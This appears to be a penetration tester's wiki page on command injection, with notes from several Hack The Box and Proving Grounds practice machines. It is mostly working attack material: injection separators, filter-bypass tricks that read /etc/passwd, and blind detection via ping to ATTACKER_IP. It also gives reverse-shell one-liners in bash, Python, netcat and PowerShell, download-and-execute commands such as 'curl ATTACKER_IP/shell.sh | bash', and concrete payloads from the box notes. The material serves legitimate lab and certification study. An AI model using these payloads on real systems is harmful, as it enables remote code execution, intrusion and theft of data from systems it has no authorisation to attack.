# Command Injection

See also: [[Web-Methodology]], [[Reverse-Shells]]

## Test Payloads

```
; id
| id
|| id
& id
&& id
`id`
$(id)
%0aid
```

Try each separator — different apps filter different characters.

## Blind Detection

```bash
# Time-based
; sleep 5
| sleep 5

# Out-of-band (listen with tcpdump icmp on attacker)
; ping -c 5 ATTACKER_IP
| ping -c 5 ATTACKER_IP
```

```bash
# Listen for ping on attacker
sudo tcpdump -i tun0 icmp
```

## Bypass Filters

### Space Bypass

```bash
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
X=$'cat\x20/etc/passwd'&&$X
cat</etc/passwd
```

### Keyword Bypass

```bash
c'a't /etc/passwd
c"a"t /etc/passwd
\c\a\t /etc/passwd
who$()ami
w"h"o"a"mi
```

### Slash Bypass

```bash
# Use env variables
${PATH:0:1}  # = /
```

## Reverse Shell from Injection

```bash
; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'
```

```bash
| python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

```bash
; curl ATTACKER_IP/shell.sh | bash
```

For more shells see [[Reverse-Shells]].

## Windows Command Injection

```
& whoami
| type C:\Users\Administrator\Desktop\proof.txt
& powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"
```

## From Your Boxes

> **Mentor** (HTB) — JSON API command injection via semicolons in path parameter
> - What worked: `{"path":"test;ping -c 1 ATTACKER_IP;"}` — trailing semicolon was required
> - Revshell: Standard bash/base64 shells failed (Docker), Python3 shortest revshell worked
> - Lesson: Always try trailing semicolons and test with ping+tcpdump before going for RCE

> **XposedAPI** (PG) — Python `os.system()` injection via unvalidated `url` parameter in `/update` endpoint
> - What worked: `{"user":"clumsyadmin","url":"http://KALI/test;nc KALI 53 -e /bin/bash"}`
> - Used LFI first to read source code (`/logs?file=../../../main.py`) and confirm the vulnerable `os.system("curl {}".format(data['url']))` call
> - Lesson: Chain LFI with command injection — read source to find the injection sink

> **Hetemit** (PG) — Python `eval()` endpoint accepting arbitrary code via POST `code=` parameter
> - What worked: `curl -X POST --data "code=os.system('nc -e /bin/bash KALI 18000')" http://TARGET:50000/verify`
> - Lesson: If an endpoint evaluates code (returns `4` for `2*2`), go straight to `os.system()`

> **Networked** (HTB) — Network script injection via user input passed to ifcfg config
> - What worked: Supplying `a /bin/bash` as argument to a sudo script that wrote to ifcfg files
> - Lesson: Any script that writes user input into system config files is a command injection target

> **QuackerJack** (PG) — rConfig 3.9.4 authenticated command injection via `search.crud.php`
> - What worked: `python3 48241.py https://TARGET:8081 admin abgrtyu KALI 80`
> - Lesson: After finding default/weak creds on admin panels, always search for authenticated RCE exploits

> **Precious** (HTB) — Ruby PDFKit command injection via backticks in URL parameter
> - What worked: `` http://TARGET/?name=%20`bash -c "bash -i >& /dev/tcp/KALI/443 0>&1"` ``
> - Lesson: PDF generators that accept URLs are prime command injection targets via backtick injection
